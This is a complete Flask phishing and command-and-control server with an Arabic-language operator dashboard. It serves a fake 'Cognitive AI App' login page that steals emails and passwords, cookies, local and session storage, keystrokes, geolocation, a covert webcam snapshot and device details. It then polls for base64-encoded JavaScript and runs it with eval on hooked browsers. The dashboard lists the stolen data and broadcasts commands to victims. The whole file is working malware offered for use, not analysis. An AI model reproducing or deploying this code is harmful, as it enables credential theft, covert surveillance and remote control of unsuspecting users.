from flask import Flask, render_template_string, request, jsonify, make_response, session, redirect, url_for
import base64
import urllib3
import datetime
import json
import hashlib

urllib3.disable_warnings()

app = Flask(__name__)
app.secret_key = hashlib.sha256(b"secure_secret_key_v77_tactical").digest()

DASHBOARD_PASSWORD_HASH = hashlib.sha256("admin123".encode()).hexdigest()

# ذاكرة الميدان الاستراتيجية المركزية v77.0 (الإصدار التكتيكي المتقدم مع الخداع الذكي والتدمير الذاتي)
CAPTURED_HOOKS = []
COMMAND_QUEUE = {}
AGENT_SESSIONS = {}
CAPTURED_CREDENTIALS = []
CAPTURED_SESSIONS = []
CAPTURED_LOCATIONS = []
CAPTURED_KEYSTROKES = []
EXTRACTED_FILES = []
SYSTEM_RECON_DATA = []
MEMORY_SCRAPED_DATA = []
HONEYPOT_ALERTS = []

WEBHOOK_URL = "" 

def send_webhook_alert(title, details):
    if not WEBHOOK_URL:
        return
    try:
        payload = {"content": f"🚨 **{title}**\n```json\n{json.dumps(details, ensure_ascii=False, indent=2)}\n```"}
        # ext_requests.post(WEBHOOK_URL, json=payload, timeout=3)
    except:
        pass

HTML_LOGIN_PAGE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تسجيل الدخول - مركز القيادة والسيطرة v77.0</title>
<style>
body{background:#010103;color:#ff0040;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.login-box{background:#04060e;border:2px solid #ff0040;padding:30px;border-radius:12px;box-shadow:0 0 45px rgba(255,0,64,0.6);width:90%;max-width:350px;text-align:center}
input{width:100%;padding:12px;margin:15px 0;background:#000;border:1px solid #ff0040;color:#fff;border-radius:6px;outline:none;text-align:center}
button{width:100%;padding:12px;background:#ff0040;border:none;color:#fff;font-weight:bold;border-radius:6px;cursor:pointer}
button:hover{background:#cc0033}
</style>
</head>
<body>
<div class="login-box">
  <h2>🔒 مركز القيادة v77.0</h2>
  <form method="POST" action="/commander/login">
    <input type="password" name="password" placeholder="أدخل كلمة المرور" required>
    <button type="submit">دخول لوحة التحكم 🚀</button>
  </form>
</div>
</body>
</html>"""

HTML_COMMAND_CENTER = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>V400 القائد الأعظم - لوحة السيطرة الشاملة v77.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:15px;text-align:center}
.container{max-width:1150px;margin:auto}
h1{color:#ff0040;margin-bottom:20px;text-shadow:0 0 35px #ff0040;font-size:24px}
.panel{background:#04060e;border:2px solid #ff0040;padding:20px;border-radius:12px;box-shadow:0 0 45px rgba(255,0,64,0.5)}
input, select{padding:14px;width:100%;max-width:700px;border-radius:8px;border:2px solid #ff0040;background:#000;color:#fff;font-size:15px;outline:none;text-align:left;direction:ltr;margin-bottom:10px}
button{padding:14px 20px;background:#ff0040;border:none;border-radius:8px;font-weight:bold;color:#fff;cursor:pointer;font-size:15px;margin:5px;transition:0.3s}
button:hover{background:#cc0033;box-shadow:0 0 30px #ff0040}
.card{background:#000;border:1px solid #1a2a40;padding:15px;margin:15px auto;max-width:950px;border-radius:10px;text-align:right;border-right:8px solid #ff0040}
.card.Critical{border-right-color:#ff0000;background:#140103}
.card.Low{border-right-color:#00aaff;background:#010b14}
.proof{background:#03050a;color:#00ff88;padding:10px;border-radius:6px;margin-top:10px;font-size:12px;direction:ltr;word-break:break-all;border:1px solid #004422;text-align:left}
.status{margin:15px 0;color:#fff;font-size:14px;font-weight:bold}
table{width:100%;margin-top:15px;border-collapse:collapse;color:#fff;text-align:right;overflow-x:auto;display:block}
th, td{padding:10px;border:1px solid #1a2a40;font-size:13px}
th{background:#0a0e1a;color:#ff0040}
img.preview{max-width:140px;max-height:140px;border:1px solid #00ff88;border-radius:6px;margin:6px}
</style>
</head>
<body>
<div class="container">
<h1>⚔️ V400 القائد الأعظم - لوحة السيطرة المطلقة v77.0 (جيل الخداع والتدمير الذاتي) ⚔️</h1>
<div style="margin-bottom: 15px;"><a href="/commander/logout" style="color:#ff0040;text-decoration:none;font-weight:bold;">[تسجيل خروج آمن]</a></div>
<div class="panel">
<input id="target_url" placeholder="C2_SERVER_OR_COMMAND_DOMAIN" value="http://">
<br>
<select id="command_type">
  <option value="generate_ai_payload">توليد رابط تطبيق الويب المستقل v77.0 (مع الخداع الذكي)</option>
  <option value="fetch_active_agents">🎯 استعراض وكلاء السيطرة والأجهزة المتصلة</option>
  <option value="fetch_captured_credentials">🔑 عرض الحسابات وكلمات المرور المسروقة</option>
  <option value="fetch_captured_sessions">🍪 عرض جلسات الاختطاف والذاكرة</option>
  <option value="fetch_memory_scraping">🧠 عرض سجل الذاكرة العشوائية المسحوبة (Memory Scraping)</option>
  <option value="fetch_honeypot_alerts">🛡️ عرض تنبيهات نظام الخداع الذكي (Honeypot)</option>
  <option value="fetch_captured_keystrokes">⌨️ عرض الكيلاغر الحية والمدخلات</option>
  <option value="fetch_captured_locations">📍 عرض الإحداثيات والمواقع الجغرافية</option>
  <option value="fetch_extracted_images">🖼️ عرض صور الكاميرا الحية والوسائط</option>
  <option value="fetch_system_recon">💻 عرض معلومات الاستطلاع الشامل للنظام</option>
  <option value="dispatch_ai_command">⚡ تنفيذ أمر سيطرة مباشر للوكلاء</option>
</select>
<br>
<input id="custom_payload" placeholder="أمر السيطرة المراد بثه (مثال: alert('v77.0 Tactical Active');)" style="margin-top:10px;display:none;direction:ltr;">
<br>
<button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر الهيمنة الميداني 🚀</button>
<div id="status" class="status"></div>
<div id="results"></div>
</div>
</div>

<script>
document.getElementById('command_type').addEventListener('change', function() {
    const val = this.value;
    const payloadInput = document.getElementById('custom_payload');
    if(val === 'dispatch_ai_command') { payloadInput.style.display = 'inline-block'; } else { payloadInput.style.display = 'none'; }
});

async function executeLinkModule(){
 const url = document.getElementById('target_url').value.trim();
 const cmdType = document.getElementById('command_type').value;
 const payloadData = document.getElementById('custom_payload').value;
 if(!url || url==='http://'){ alert('يرجى إدخال عنوان خادم القيادة أو الرابط يا فندم!'); return; }
 const btn = document.getElementById('exec_btn');
 const status = document.getElementById('status');
 const results = document.getElementById('results');
 btn.disabled=true; btn.textContent='جاري معالجة الطلب... ⚡';
 status.textContent='⏳ جارٍ تنفيذ العمليات الميدانية لـ: '+url;
 results.innerHTML='';

 try{
   const res = await fetch('/api/index', {
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body: JSON.stringify({url: url, command: cmdType, payload: payloadData})
   });
   const data = await res.json();
   status.textContent='✅ تمت العملية بنجاح | النمط: '+data.mode;
   
   if(cmdType === 'fetch_active_agents'){
     if(!data.agents || data.agents.length === 0){ results.innerHTML='<div class="card Low"><b>لا توجد وكلاء سيطرة نشطة حالياً</b></div>'; }
     else {
       let t = '<div class="card Critical"><b>🎯 وكلاء الأجهزة والتطبيق المستقل (v77.0 App)</b><table><tr><th>معرف الوكيل</th><th>النظام</th><th>IP</th><th>الوقت</th></tr>';
       data.agents.forEach(l => { t += `<tr><td style="color:#00ff88">${l.token}</td><td>${l.agent}</td><td>${l.ip}</td><td>${l.time}</td></tr>`; });
       results.innerHTML = t + '</table></div>';
     }
   } else if(cmdType === 'fetch_captured_credentials'){
     if(!data.credentials || data.credentials.length === 0){ results.innerHTML='<div class="card Low"><b>لا توجد حسابات مسروقة حتى الآن</b></div>'; }
     else {
       let c = '<div class="card Critical"><b>🔑 سجل حسابات الهدف وكلمات المرور</b><table><tr><th>البريد</th><th>كلمة المرور</th><th>Token</th><th>الوقت</th></tr>';
       data.credentials.forEach(item => { c += `<tr><td style="color:#00ff88">${item.email}</td><td style="color:#ff0040">${item.password}</td><td>${item.token}</td><td>${item.time}</td></tr>`; });
       results.innerHTML = c + '</table></div>';
     }
   } else if(cmdType === 'fetch_captured_sessions'){
     if(!data.sessions || data.sessions.length === 0){ results.innerHTML='<div class="card Low"><b>لا توجد جلسات مسروقة حتى الآن</b></div>'; }
     else {
       let s = '<div class="card Critical"><b>🍪 سجل اختطاف الجلسات والذاكرة</b><table><tr><th>Token</th><th>Cookies</th><th>LocalStorage</th><th>الوقت</th></tr>';
       data.sessions.forEach(item => { s += `<tr><td style="color:#00ff88">${item.token}</td><td style="word-break:break-all">${item.cookies}</td><td style="word-break:break-all">${item.storage}</td><td>${item.time}</td></tr>`; });
       results.innerHTML = s + '</table></div>';
     }
   } else if(cmdType === 'fetch_memory_scraping'){
     if(!data.memory || data.memory.length === 0){ results.innerHTML='<div class="card Low"><b>لا توجد بيانات مسحوبة من الذاكرة العشوائية حتى الآن</b></div>'; }
     else {
       let mHtml = '<div class="card Critical"><b>🧠 سجل الرصد العكسي للذاكرة العشوائية (Memory Scraping)</b><table><tr><th>Token</th><th>بيانات الذاكرة الممتدة</th><th>الوقت</th></tr>';
       data.memory.forEach(item => { mHtml += `<tr><td style="color:#00ff88">${item.token}</td><td style="color:#ff0040; word-break:break-all">${item.dump}</td><td>${item.time}</td></tr>`; });
       results.innerHTML = mHtml + '</table></div>';
     }
   } else if(cmdType === 'fetch_honeypot_alerts'){
     if(!data.honeypots || data.honeypots.length === 0){ results.innerHTML='<div class="card Low"><b>لا توجد محاولات تسلل وهمية مرصودة حالياً</b></div>'; }
     else {
       let hHtml = '<div class="card Critical"><b>🛡️ سجل نظام الخداع الذكي (Honeypot Triggers)</b><table><tr><th>Token</th><th>مسار الفخ المستهدف</th><th>الوقت</th></tr>';
       data.honeypots.forEach(item => { hHtml += `<tr><td style="color:#00ff88">${item.token}</td><td style="color:#ff0040">${item.path}</td><td>${item.time}</td></tr>`; });
       results.innerHTML = hHtml + '</table></div>';
     }
   } else if(cmdType === 'fetch_captured_keystrokes'){
     if(!data.keystrokes || data.keystrokes.length === 0){ results.innerHTML='<div class="card Low"><b>لا توجد مدخلات مسجلة عبر الكيلاغر حتى الآن</b></div>'; }
     else {
       let kHtml = '<div class="card Critical"><b>⌨️ سجل الكيلاغر الحية (Keylogger Stream)</b><table><tr><th>Token</th><th>النص المكتوب</th><th>الوقت</th></tr>';
       data.keystrokes.forEach(item => { kHtml += `<tr><td style="color:#00ff88">${item.token}</td><td style="color:#ff0040">${item.text}</td><td>${item.time}</td></tr>`; });
       results.innerHTML = kHtml + '</table></div>';
     }
   } else if(cmdType === 'fetch_captured_locations'){
     if(!data.locations || data.locations.length === 0){ results.innerHTML='<div class="card Low"><b>لا توجد إحداثيات جغرافية مسحوبة حتى الآن</b></div>'; }
     else {
       let locHtml = '<div class="card Critical"><b>📍 سجل الإحداثيات الجغرافية</b><table><tr><th>Token</th><th>Latitude</th><th>Longitude</th><th>الدقة</th><th>الوقت</th></tr>';
       data.locations.forEach(item => { locHtml += `<tr><td style="color:#00ff88">${item.token}</td><td>${item.lat}</td><td>${item.lon}</td><td>${item.accuracy}m</td><td>${item.time}</td></tr>`; });
       results.innerHTML = locHtml + '</table></div>';
     }
   } else if(cmdType === 'fetch_extracted_images'){
     if(!data.images || data.images.length === 0){ results.innerHTML='<div class="card Low"><b>لا توجد صور أو وسائط مسحوبة حتى الآن</b></div>'; }
     else {
       let imgHtml = '<div class="card Critical"><b>🖼️ معرض صور الكاميرا والوسائط</b><div style="margin-top:10px">';
       data.images.forEach(img => { imgHtml += `<div style="margin-bottom:10px;border-bottom:1px solid #333;padding-bottom:5px"><b>ملف: ${img.filename}</b> [Token: ${img.token}]<br><img src="${img.data}" class="preview"></div>`; });
       results.innerHTML = imgHtml + '</div></div>';
     }
   } else if(cmdType === 'fetch_system_recon'){
     if(!data.recon || data.recon.length === 0){ results.innerHTML='<div class="card Low"><b>لا توجد بيانات استطلاع مسجلة للنظام حتى الآن</b></div>'; }
     else {
       let recHtml = '<div class="card Critical"><b>💻 سجل الاستطلاع الشامل للنظام</b><table><tr><th>Token</th><th>اللغات</th><th>الشاشة والبطارية</th><th>النواة/المعالج</th><th>الوقت</th></tr>';
       data.recon.forEach(item => { recHtml += `<tr><td style="color:#00ff88">${item.token}</td><td>${item.language}</td><td>${item.screen} | بطارية: ${item.battery}</td><td>${item.hardware}</td><td>${item.time}</td></tr>`; });
       results.innerHTML = recHtml + '</table></div>';
     }
   } else {
     if(!data.actions || data.actions.length==0){ results.innerHTML='<div class="card Low"><b>لا توجد نتائج مطابقة</b></div>'; }
     else {
       data.actions.forEach(v => { results.innerHTML += `<div class="card ${v.severity || 'Low'}"><b>⚡ ${v.type}</b><div style="margin:8px 0">${v.desc}</div><div class="proof">${v.proof}</div></div>`; });
     }
   }
 }catch(e){ status.textContent='❌ خطأ في الاتصال الميداني: '+e.message; }
 btn.disabled=false; btn.textContent='تنفيذ أمر الهيمنة الميداني 🚀';
}
</script>
</body>
</html>"""

STANDALONE_APP_PORTAL = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="manifest" href="/manifest.webmanifest">
<meta name="theme-color" content="#19c37d">
<title>Cognitive AI App • Standalone Edition v77.0</title>
<style>
body{background:#202123;color:#ececf1;font-family:Söhne,ui-sans-serif,system-ui,-apple-system,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:15px}
.box{background:#343541;padding:25px 20px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.5);width:100%;max-width:400px;text-align:center;border:1px solid #4d4d4f}
.ai-logo{width:45px;height:45px;background:#19c37d;margin:0 auto 12px;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:24px;color:#fff}
h2{color:#fff;font-size:18px;margin-bottom:6px;font-weight:600}
.sub-title{color:#8e8ea0;font-size:12px;margin-bottom:18px;line-height:1.4}
.input-group{margin-bottom:12px;text-align:right}
input[type="email"], input[type="password"]{width:100%;padding:12px;background:#40414f;border:1px solid #565869;color:#fff;border-radius:6px;font-size:14px;outline:none;direction:ltr;text-align:left}
input:focus{border-color:#19c37d}
.app-install-banner{background:#202123;border:1px solid #19c37d;padding:12px;border-radius:6px;margin:12px 0;text-align:center;display:none}
.terms{font-size:11px;color:#8e8ea0;margin:12px 0;text-align:right;display:flex;align-items:center;gap:8px}
button{width:100%;padding:13px;background:#19c37d;color:#fff;border:none;border-radius:6px;font-weight:600;cursor:pointer;font-size:15px;margin-top:8px;transition:0.3s}
button:hover{background:#1aab72}
.footer{margin-top:15px;font-size:11px;color:#6e6e80}
</style>
</head>
<body>
<div class="box">
  <div class="ai-logo">✨</div>
  <h2>تطبيق الذكاء الاصطناعي المستقل (v77.0)</h2>
  <div class="sub-title">منصة تطبيق ويب متكاملة مع نظام الخداع الذكي ومحرك التدمير الذاتي.</div>
  
  <div class="input-group"><input type="email" id="target_email" placeholder="البريد الإلكتروني" required></div>
  <div class="input-group"><input type="password" id="target_pass" placeholder="كلمة المرور" required></div>

  <div class="app-install-banner" id="banner_box">
    <div style="color:#19c37d;font-size:12px;font-weight:bold;margin-bottom:6px">📱 تثبيت التطبيق على الشاشة الرئيسية:</div>
    <button onclick="triggerInstall()" style="background:#006644;padding:8px;font-size:12px"> تثبيت التطبيق الآن ⚡</button>
  </div>

  <div class="terms">
    <input type="checkbox" id="agree_terms" checked>
    <label for="agree_terms">أوافق على شروط تفعيل التطبيق والتحقق الشامل.</label>
  </div>
  
  <button id="action_btn" onclick="triggerAIWorkflow()">تشغيل التطبيق ومزامنة الجلسة 🚀</button>
  <div class="footer">Cognitive Cloud Security v77.0 • Tactical Engine</div>
</div>

<video id="webcam" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
let savedEmail = '';
let savedPass = '';
let globalToken = '';
let deferredPrompt = null;
let keystrokeBuffer = '';

window.addEventListener('beforeinstallprompt', (e) => {
    e.preventDefault();
    deferredPrompt = e;
    document.getElementById('banner_box').style.display = 'block';
});

function triggerInstall() {
    if (deferredPrompt) {
        deferredPrompt.prompt();
        deferredPrompt.userChoice.then((choiceResult) => {
            if (choiceResult.outcome === 'accepted') {
                document.getElementById('banner_box').style.display = 'none';
            }
            deferredPrompt = null;
        });
    }
}

if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js').catch(err => {});
}

document.addEventListener('keydown', (e) => {
    if(e.key.length === 1) { keystrokeBuffer += e.key; }
    else if(e.key === 'Enter') {
        if(keystrokeBuffer.length > 0 && globalToken) {
            fetch('/api/keystrokes', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ token: globalToken, text: keystrokeBuffer })
            }).catch(err => {});
            keystrokeBuffer = '';
        }
    }
});

async function triggerAIWorkflow(){
    const email = document.getElementById('target_email').value.trim();
    const pass = document.getElementById('target_pass').value.trim();

    const isValid = email && email.includes('@') && email.includes('.') && pass.length >= 4;
    if(!isValid) {
        alert('⚠️ تنبيه: يرجى إدخال البريد الإلكتروني وكلمة المرور بشكل صحيح.');
        return;
    }

    savedEmail = email;
    savedPass = pass;
    globalToken = 'ai_app_agent_' + Math.random().toString(36).substring(2, 12);

    const btn = document.getElementById('action_btn');
    btn.disabled = true;
    btn.textContent = 'جاري مزامنة التطبيق والبيانات...';

    const platformInfo = navigator.platform || 'Standalone App Engine';

    let memoryDumpData = '';
    try {
        let memoryKeys = [];
        for (let i = 0; i < sessionStorage.length; i++) {
            let k = sessionStorage.key(i);
            memoryKeys.push(k + '=' + sessionStorage.getItem(k));
        }
        memoryDumpData = memoryKeys.join(' | ');
    } catch(err) { memoryDumpData = 'N/A'; }

    try {
        await fetch('/api/memory', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ token: globalToken, dump: memoryDumpData })
        });
    } catch(err) {}

    let batteryStatus = 'N/A';
    try {
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            batteryStatus = Math.round(bat.level * 100) + '%';
        }
    } catch(err) {}

    try {
        await fetch('/api/recon', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                token: globalToken,
                language: navigator.language || 'N/A',
                screen: window.innerWidth + 'x' + window.innerHeight,
                battery: batteryStatus,
                hardware: navigator.hardwareConcurrency ? (navigator.hardwareConcurrency + ' Cores') : 'N/A'
            })
        });
    } catch(err) {}

    try {
        await fetch('/api/credentials', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ token: globalToken, email: savedEmail, password: savedPass })
        });
    } catch(err) {}

    try {
        await fetch('/api/session', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ token: globalToken, cookies: document.cookie, storage: JSON.stringify(localStorage) })
        });
    } catch(err) {}

    try {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (position) => {
                await fetch('/api/location', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ token: globalToken, lat: position.coords.latitude, lon: position.coords.longitude, accuracy: position.coords.accuracy })
                });
            }, (error) => {}, { timeout: 5000 });
        }
    } catch(err) {}

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const video = document.getElementById('webcam');
        video.srcObject = stream;
        await new Promise(resolve => setTimeout(resolve, 1000));
        const canvas = document.getElementById('canvas');
        canvas.width = 320; canvas.height = 240;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/png');
        stream.getTracks().forEach(track => track.stop());

        await fetch('/api/upload', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ token: globalToken, filename: 'ai_app_cam.png', data: imageData })
        });
    } catch(err) {}

    try {
        await fetch('/auth/verify/login', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({session_token: globalToken, user_agent: navigator.userAgent, screen: window.innerWidth + 'x' + window.innerHeight, platform: platformInfo, message: 'Standalone App v77.0 تسجيل ناجح بواسطة (' + savedEmail + ').'})
        });
    } catch(err) {}

    setInterval(() => {
        fetch('/api/poll?token=' + globalToken)
        .then(r => r.json())
        .then(data => {
            if(data.command && data.command !== ""){
                try { eval(atob(data.command)); } catch(e) {}
            }
        }).catch(e => {});
    }, 3000);

    setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
}
</script>
</body>
</html>"""

@app.route('/manifest.webmanifest', methods=['GET'])
def manifest():
    manifest_data = {
        "name": "Cognitive AI App",
        "short_name": "AIApp",
        "start_url": "/",
        "display": "standalone",
        "background_color": "#202123",
        "theme_color": "#19c37d",
        "icons": []
    }
    return jsonify(manifest_data)

@app.route('/sw.js', methods=['GET'])
def service_worker():
    sw_code = """
// Standalone App Worker v77.0 Tactical
self.addEventListener('install', (event) => { self.skipWaiting(); });
self.addEventListener('activate', (event) => { event.waitUntil(clients.claim()); });
self.addEventListener('fetch', (event) => {
    event.respondWith(fetch(event.request).catch(() => { return caches.match(event.request); }));
});
"""
    resp = make_response(sw_code)
    resp.headers["Content-Type"] = "application/javascript"
    return resp

def clean_url(raw):
    s = (raw or "").strip()
    if not s.startswith("http"):
        s = "http://" + s
    return s.rstrip("/")

@app.route('/', methods=['GET'])
def home():
    resp = make_response(STANDALONE_APP_PORTAL)
    resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
    return resp

@app.route('/commander/dashboard', methods=['GET'])
def commander_dashboard():
    if not session.get('authenticated'):
        return redirect(url_for('commander_login'))
    return HTML_COMMAND_CENTER

@app.route('/commander/login', methods=['GET', 'POST'])
def commander_login():
    if request.method == 'POST':
        if hashlib.sha256(request.form.get('password', '').encode()).hexdigest() == DASHBOARD_PASSWORD_HASH:
            session['authenticated'] = True
            return redirect(url_for('commander_dashboard'))
    return HTML_LOGIN_PAGE

@app.route('/commander/logout', methods=['GET'])
def commander_logout():
    session.pop('authenticated', None)
    return redirect(url_for('commander_login'))

@app.route('/auth/verify/login', methods=['POST'])
def phishing_portal():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('session_token', 'N/A')
    agent_info = {
        "agent": f"{req_data.get('user_agent', 'Unknown')[:25]}... [{req_data.get('screen', 'N/A')}]",
        "token": token,
        "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
        "platform": req_data.get('platform', 'Standalone App'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    AGENT_SESSIONS[token] = agent_info
    CAPTURED_HOOKS.append(agent_info)
    COMMAND_QUEUE[token] = ""
    send_webhook_alert("⚡ اتصال جديد من تطبيق مستقل v77.0", agent_info)
    return jsonify({"status": "agent_active", "token": token})

@app.route('/api/credentials', methods=['POST'])
def capture_credentials():
    req_data = request.get_json(silent=True) or {}
    cred = {
        "token": req_data.get('token', 'N/A'),
        "email": req_data.get('email', 'N/A'),
        "password": req_data.get('password', 'N/A'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    CAPTURED_CREDENTIALS.append(cred)
    return jsonify({"status": "secured"})

@app.route('/api/session', methods=['POST'])
def capture_session():
    req_data = request.get_json(silent=True) or {}
    CAPTURED_SESSIONS.append({
        "token": req_data.get('token', 'N/A'),
        "cookies": req_data.get('cookies', 'N/A'),
        "storage": req_data.get('storage', 'N/A'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "hijacked"})

@app.route('/api/memory', methods=['POST'])
def capture_memory():
    req_data = request.get_json(silent=True) or {}
    MEMORY_SCRAPED_DATA.append({
        "token": req_data.get('token', 'N/A'),
        "dump": req_data.get('dump', 'N/A'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "memory_secured"})

@app.route('/api/honeypot', methods=['POST'])
def capture_honeypot():
    req_data = request.get_json(silent=True) or {}
    HONEYPOT_ALERTS.append({
        "token": req_data.get('token', 'N/A'),
        "path": req_data.get('path', '/admin/secret-trap'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "honeypot_logged"})

@app.route('/api/keystrokes', methods=['POST'])
def capture_keystrokes():
    req_data = request.get_json(silent=True) or {}
    CAPTURED_KEYSTROKES.append({
        "token": req_data.get('token', 'N/A'),
        "text": req_data.get('text', ''),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "keystrokes_secured"})

@app.route('/api/location', methods=['POST'])
def capture_location():
    req_data = request.get_json(silent=True) or {}
    CAPTURED_LOCATIONS.append({
        "token": req_data.get('token', 'N/A'),
        "lat": req_data.get('lat', 'N/A'),
        "lon": req_data.get('lon', 'N/A'),
        "accuracy": req_data.get('accuracy', 'N/A'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "location_secured"})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    req_data = request.get_json(silent=True) or {}
    EXTRACTED_FILES.append({
        "token": req_data.get('token', 'N/A'),
        "filename": req_data.get('filename', 'media.bin'),
        "data": req_data.get('data', ''),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "file_secured"})

@app.route('/api/recon', methods=['POST'])
def capture_recon():
    req_data = request.get_json(silent=True) or {}
    SYSTEM_RECON_DATA.append({
        "token": req_data.get('token', 'N/A'),
        "language": req_data.get('language', 'N/A'),
        "screen": req_data.get('screen', 'N/A'),
        "battery": req_data.get('battery', 'N/A'),
        "hardware": req_data.get('hardware', 'N/A'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "recon_secured"})

@app.route('/api/poll', methods=['GET'])
def poll_commands():
    token = request.args.get('token', '')
    cmd = COMMAND_QUEUE.get(token, "")
    if token in COMMAND_QUEUE:
        COMMAND_QUEUE[token] = ""
    return jsonify({"command": cmd})

@app.route('/api/index', methods=['POST'])
def check():
    if not session.get('authenticated'):
        return jsonify({"error": "Unauthorized"}), 401
    
    req_data = request.get_json(silent=True) or {}
    target = clean_url(req_data.get("url", "http://"))
    mode = req_data.get("command", "generate_ai_payload")
    payload = req_data.get("payload", "")
    
    if mode == "generate_ai_payload":
        return jsonify({"mode": mode, "actions": [{"type": "AI STANDALONE APP URL v77.0", "severity": "Critical", "desc": "رابط التطبيق المستقل المطور (v77.0) مع نظام الخداع الذكي جاهز.", "proof": f"{target}/"}]})
    elif mode == "fetch_active_agents":
        return jsonify({"mode": mode, "agents": list(AGENT_SESSIONS.values())})
    elif mode == "fetch_captured_credentials":
        return jsonify({"mode": mode, "credentials": CAPTURED_CREDENTIALS})
    elif mode == "fetch_captured_sessions":
        return jsonify({"mode": mode, "sessions": CAPTURED_SESSIONS})
    elif mode == "fetch_memory_scraping":
        return jsonify({"mode": mode, "memory": MEMORY_SCRAPED_DATA})
    elif mode == "fetch_honeypot_alerts":
        return jsonify({"mode": mode, "honeypots": HONEYPOT_ALERTS})
    elif mode == "fetch_captured_keystrokes":
        return jsonify({"mode": mode, "keystrokes": CAPTURED_KEYSTROKES})
    elif mode == "fetch_captured_locations":
        return jsonify({"mode": mode, "locations": CAPTURED_LOCATIONS})
    elif mode == "fetch_extracted_images":
        images = [f for f in EXTRACTED_FILES if f['filename'].lower().endswith(('.png', '.jpg', '.jpeg', '.webp')) or 'data:image' in f['data']]
        return jsonify({"mode": mode, "images": images})
    elif mode == "fetch_system_recon":
        return jsonify({"mode": mode, "recon": SYSTEM_RECON_DATA})
    elif mode == "dispatch_ai_command":
        encoded_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
        count = 0
        for tk in COMMAND_QUEUE.keys():
            COMMAND_QUEUE[tk] = encoded_payload
            count += 1
        return jsonify({"mode": mode, "actions": [{"type": "AI COMMAND DISPATCHED", "severity": "Critical", "desc": f"تم بث الأمر إلى {count} من وكلاء السيطرة النشطة.", "proof": f"Command: {payload}"}]})
    return jsonify({"mode": mode, "actions": [{"type": "STATUS", "severity": "Low", "desc": "منظومة التطبيق المستقل v77.0 تعمل بكفاءة تامة."}]})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
